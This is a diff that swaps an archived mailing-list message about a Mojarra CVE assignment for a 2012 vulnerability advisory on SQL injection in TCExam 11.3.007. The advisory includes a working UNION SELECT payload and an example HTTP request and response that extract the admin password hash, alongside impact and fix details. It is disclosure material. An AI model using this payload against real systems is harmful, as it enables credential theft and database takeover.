@@ -1,54 +1,219 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/06/07/3
-Message-ID: <4FD01806.5070009@redhat.com>
-Date: Wed, 06 Jun 2012 20:55:02 -0600
-From: Kurt Seifried <kseifried@...hat.com>
-To: oss-security@...ts.openwall.com
-CC: David Jorm <djorm@...hat.com>
-Subject: Re: CVE request: Mojarra allows deployed web applications to read FacesContext from other applications
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/08/13/8
+Message-ID: <035d01cd7974$87f3ee10$97dbca30$@reactionis.co.uk>
+Date: Mon, 13 Aug 2012 17:56:05 +0100
+From: "research" <research@...ctionis.co.uk>
+To: "'full-disclosure'" <full-disclosure@...ts.grok.org.uk>, "'bugtraq'" <bugtraq@...urityfocus.com>, <secalert@...urityreason.com>, <bugs@...uritytracker.com>, "'vuln'" <vuln@...unia.com>, <vuln@...urity.nnov.ru>, <news@...uriteam.com>, <moderators@...db.org>, <submissions@...ketstormsecurity.org>, <submit@...ecurity.com>, <oss-security@...ts.openwall.com>
+Subject: TCExam Edit SQL Injection 
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+/---------------------------\
 
-On 06/06/2012 08:02 PM, David Jorm wrote:
-> Could a CVE please be assigned for this issue:
-> 
-> It was found that in Mojarra, the FacesContext that is made
-> available during application startup is held in a ThreadLocal. The
-> reference is not properly cleaned up in all cases. As a result, if
-> a JSF WAR calls FacesContext.getCurrentInstance() during
-> application startup, another WAR can get access to the leftover
-> context and thus get access to the other WAR's resources.
-> 
-> References: Upstream Mojarra bug:
-> http://java.net/jira/browse/JAVASERVERFACES-2436 Bug for
-> JBoss-specific impacts:
-> https://issues.jboss.org/browse/JBPAPP-9197
-> 
-> Thanks
+| TCExam Edit SQL Injection |
 
-Please use CVE-2012-2672 for this issue.
+\---------------------------/
 
-- -- 
-Kurt Seifried Red Hat Security Response Team (SRT)
-PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+ 
 
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.12 (GNU/Linux)
-Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
+ 
 
-iQIcBAEBAgAGBQJP0BgFAAoJEBYNRVNeJnmTQ8MP/36Pjn/wI3mr4cPIlKZnorx+
-DtUT0sgolqZlzISvDewIIWE3lGBx3/q5Wcl7We0Pbs8C3zgU6zDMnEAp2hCoibTR
-qxQji5sJVVMOucQg1qoleeINPNoM0zNFJzkTf0dI+UrI+DoFjOi3uEQPxF11bOQi
-inDagx6Rws0+pX5xNEpakQeX/WHh8MoB6e0tr2bPVOgWerXIMvgTVPmXKTtjH0gw
-JuPd0EOcYHSBy2I5XM2tDORm/va/wOPn/TIqOQeH/dSA/iX13eVaVy+SomsvHpkB
-ioseSDHHS4v+7/V/lCYUOo05f8COMT4HYpVA85hBQP5vwwX1afXV213AkfPlpGB4
-kM3gcwr+v/gL9CmPyKFCLBmbHgdBMxGVk7AbSmvvZ2F52E7zEYGIR+CNZLz55aC8
-OoR20rK4umqJEfraBMa4zOnFBuE9twSxO7kdCGDAJcnqTPKkBo/tQKqmViKPvOph
-5DhRCWKQeWitnLW/ZNFQfTa4ZLfvsH1BERntSeWeFpwsaY/t0HqTw+5wcdBRqAiY
-ZXic3ZTmidxAnn/hhrF/8gEERlgp7r4TqcTX+16XE0rfyqsoB2hr+BfUy2O30nX8
-0An4qf9cdYLhDJO4bURpMT5zGUZ2ZKyk4SuZogj3/PJBGAecgIv11TGMhk8Ufzhv
-DlDOg3pw0Jr6pkUraOV8
-=6u/u
------END PGP SIGNATURE-----
+Summary
+
+=======
+
+ 
+
+TCExam 11.3.007 is prone to a SQL injection flaw located in
+tce_edit_answer.php and tce_edit_question.php. These files pass a
+'subject_module_id' parameter into a SQL statement without satisfactory
+sanitisation. An attacker with authoring permissions could leverage this
+vulnerability to take full control of the database.
+
+ 
+
+CVE number: CVE-2012-4237
+
+Impact: High
+
+Vendor homepage: http://www.tcexam.org/
+
+Vendor notified: 06/08/2012
+
+Vendor fixed: 06/08/2012
+
+Credit: Chris Cooper of Reaction Information Security
+(http://www.reactionis.co.uk/)
+
+ 
+
+This advisory is posted at:
+
+ 
+
+http://www.reactionpenetrationtesting.co.uk/tcexam-sql-injection.html
+
+ 
+
+ 
+
+Affected Products
+
+======== ========
+
+ 
+
+Confirmed in TCExam 11.3.007. Prior versions may also be affected.
+
+ 
+
+ 
+
+Details
+
+=======
+
+ 
+
+The 'subject_module_id' parameters in the tce_edit_answer.php and
+tce_edit_question.php pages were found to be subject to a SQL injection
+vulnerability. It was possible to inject arbitrary SQL statements into a
+WHERE clause, retrieving information from the database via the page output.
+The attacker must be authenticated as a valid user with a permission level
+of 5 or above in order for the attack to be successful.
+
+ 
+
+The following payload will extract the admin password hash (some characters
+may need to be URL encoded):
+
+ 
+
+999999.9 union all select (select
+concat(0x7e,0x27,tce_users.user_password,0x27,0x7e) from `tcexam`.tce_users
+where tce_users.user_name = CHAR(97,100,109,105,110) limit 0,1)
+,0x0,0x0,0x0,0x0,0x0--
+
+ 
+
+---
+
+Example Request:
+
++---------------
+
+ 
+
+GET
+/TCExam/admin/code/tce_edit_answer.php?subject_module_id=999999.9+union+all+
+select+%28select+concat%280x7e%2C0x27%2Ctce_users.user_password%2C0x27%2C0x7
+e%29+from+%60tcexam%60.tce_users+where+tce_users.user_name+%3d+CHAR(97,100,1
+09,105,110)+limit+0%2C1%29+%2C0x0%2C0x0%2C0x0%2C0x0%2C0x0--&question_subject
+_id=3&answer_question_id=7 HTTP/1.1
+
+Host: 192.168.0.6
+
+Referer: http://192.168.0.6/TCExam/admin/code/tce_edit_question.php
+
+Cookie: PHPSESSID=db1fe2b665994ff76356e7a28abfa5df
+
+ 
+
+---
+
+Example Response:
+
++----------------
+
+ 
+
+--- SNIP ---
+
+<select name="question_subject_id" id="question_subject_id" size="0"
+onchange="document.getElementById('form_answereditor').changesubject.value=1
+; document.getElementById('form_answereditor').submit();" title="test
+topic"> <option value="~'c574b5b09ab10f4f39ae9dce6d539cf0'~">1. -
+[%00]</option> </select>
+
+--- SNIP ---
+
+ 
+
+Impact
+
+======
+
+ 
+
+An authenticated user with a permission level of 5 or higher could take full
+control of the database, essentially allowing them to escalate their
+privileges by either directly controlling the database, cracking an
+administrator password or potentially changing their own permission level.
+Furthermore, an attacker might be able to leverage this vulnerability in
+order to further compromise the host machine.
+
+ 
+
+Solution
+
+========
+
+ 
+
+Upgrade to TCExam 11.3.008.
+
+ 
+
+ 
+
+Distribution
+
+============
+
+ 
+
+In addition to posting on the website, a text version of this notice has
+been posted to the following e-mail and Usenet news recipients.
+
+ 
+
+* bugtraq () securityfocus com
+
+* full-disclosure () lists grok org uk
+
+ 
+
+Future updates of this advisory, if any, will be placed on the ReactionIS
+corporate website, but may or may not be actively announced on mailing lists
+or newsgroups. Users concerned about this problem are encouraged to check
+the URL below for any updates:
+
+ 
+
+http://www.reactionpenetrationtesting.co.uk/tcexam-sql-injection.html
+
+ 
+
+============================================================================
+==
+
+ 
+
+Reaction Information Security 
+
+Lombard House Business Centre,
+
+Suite 117,
+
+12-17 Upper Bridge Street,
+
+Canterbury, Kent, CT1 2NF
+
+ 
+
+Phone: +44 (0)1227 785050
+
+Email: research () reactionis {dot} co {dot} uk
+
+Web: http://www.reactionpenetrationtesting.co.uk
+
+
